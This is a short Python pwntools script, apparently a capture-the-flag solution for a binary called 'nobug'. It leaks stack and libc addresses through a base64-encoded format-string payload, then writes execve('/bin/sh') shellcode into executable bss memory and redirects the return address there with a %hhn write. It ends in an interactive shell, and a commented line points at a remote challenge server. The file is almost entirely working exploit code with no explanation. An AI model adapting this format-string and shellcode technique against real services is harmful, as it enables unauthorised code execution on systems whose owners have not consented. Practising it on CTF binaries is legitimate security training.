from pwn import *
import base64
context.binary = ELF("./nobug")
context.log_level = 'debug'

elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0x08048BC0')
	raw_input()


def payload_encode(payload):
	pass

def exploit():
	#
	#leak
	payload = "%4$p%29$p"
	p.send(base64.b64encode(payload))
	p.sendline('')

	leak_stack = int(p.recv(10), 16)
	libc_start_main =int(p.recvline().strip('\n'), 16)
	libc.address = libc_start_main - 247 - libc.symbols['__libc_start_main']
	print "libc_base ==> ", hex(libc.address)
	print "leak_stack ==> ", hex(leak_stack)

	ret_addr = leak_stack - 0x1c
	dbg()
	#bss is rwx
	#write shellcode to bss, and modify ret to bss

	shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
	payload = shellcode + '%{}c%4$hhn'.format((ret_addr & 0xff) - len(shellcode))
	p.send(base64.b64encode(payload))
	p.sendline()

	p.interactive()
	p.close()


if __name__ == '__main__':
	p = process("./nobug")
	#p = remote('111.198.29.45', 34746)
	exploit()